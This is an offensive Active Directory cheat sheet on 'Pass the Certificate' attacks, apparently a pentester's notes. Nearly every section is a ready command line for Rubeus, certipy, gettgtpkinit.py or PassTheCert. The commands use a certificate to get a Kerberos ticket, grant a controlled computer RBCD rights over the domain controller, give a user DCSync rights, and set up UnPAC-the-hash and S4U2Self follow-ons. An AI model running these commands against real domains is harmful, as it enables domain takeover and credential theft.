# Pass the Certificate

## Tools: gettgtpkinit.py , Rubeus , certipy

# PKINIT

#### 1) Rubeus

 - Rubeus.exe asktgt /user:"USERNAME" /certificate:"PFX_FILE" [/password:"CERTIFICATE_PASSWORD] /domain:"FQDN_DOMAIN" /dc:"DC" /show

#### 2) certipy

 - certipy auth -pfx CRT_FILE -dc-ip DC_IP

#### 3) gettgtpkinit.py

 - gettgtpkinit.py -cert-pfx "PFX_FILE" [cert-pfx-pass "CERT_PASSWORD"] "FQDN_DOMAIN/USER "TGT_CCACHE_FILE"

### These 3 techniques can be performed for a Pass-the-Ticket attack

# Schannel (Secure Channel)

#### 1) certipy

 - certipy auth -pfx CRT_FILE -ldap-shell

 - add_computer

 - set_rbcd

#### 2) PassTheCert.py https://github.com/AlmondOffSec/PassTheCert.git

### Extract the .key and .crt files from the .pfx file

 - openssl pkcs12 -in USER_CERT.pfx -nocerts -out USER.key (Extract the .key file. Leave import password blank and put something like 1234 for PEM pass.)

 - openssl pkcs12 -in USER_CERT.pfx -clcerts -nokeys -out USER.crt (Extract the .crt file)

 - python3 passthecert.py -dc-ip DC_IP -crt USER.crt -key USER.key -domain DOMAIN.LOCAL -port 636 -action write_rbcd -delegate-to 'DOMAIN$' -delegate-from 'OUR_COMP$' (Authenticate against LDAPS using Schannel. In this example, we give the computer account we control RBCD, AKA delegation rights over the DC. Enter the PEM phrase we used when extracting the .key file earlier)

### With this technique, we can now perform an RBCD attack

# Pass-the-Certificate

### Pass the Certificate in order to get a TGT, this technique is used in "UnPAC the Hash" and "Shadow Credential"

## Windows

#### 1) Information about a cert file

 - certutil -v -dump admin.pfx

#### 2) From a base64 PFX

 - Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show

#### 3) Grant DCSync rights to a user

 - ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target DOMAIN\USER --elevate

#### 4) To restore

 - ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target DOMAIN\USER --restore

### PEM certificates can be exported to a PFX format with openssl. Rubeus doesn't handle PEM certificates.

 - openssl pkcs12 -in "cert.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"

### Certipy uses DER encryption. To generate a PFX for Rubeus, openssl can be used.

 - openssl rsa -inform DER -in key.key -out key-pem.key

 - openssl x509 -inform DER -in cert.crt -out cert.pem -outform PEM

 - openssl pkcs12 -in cert.pem -inkey key-pem.key -export -out cert.pfx


## Linux

#### 1) Base64-encoded PFX certificate (string) (password can be set)

 - gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

#### 2) PEM certificate (file) + PEM private key (file)

 - gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

#### 3) PFX certificate (file) + password (string, optionnal)

 - gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

#### 4) Using Certipy

 - certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'

 - certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"

### The ticket obtained can then be used to

#### 1) Authenticate with pass-the-cache

#### 2) Conduct an UnPAC-the-hash attack. This can be done with getnthash.py from PKINITtools.

#### 3) Obtain access to the account's SPN with an S4U2Self. This can be done with gets4uticket.py from PKINITtools.

## Alternate Method: PassTheCert https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py

#### 1) Extract key and cert from the pfx

 - certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"

 - certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"

#### 2) Elevate a user for DCSync with passthecert.py

 - passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate
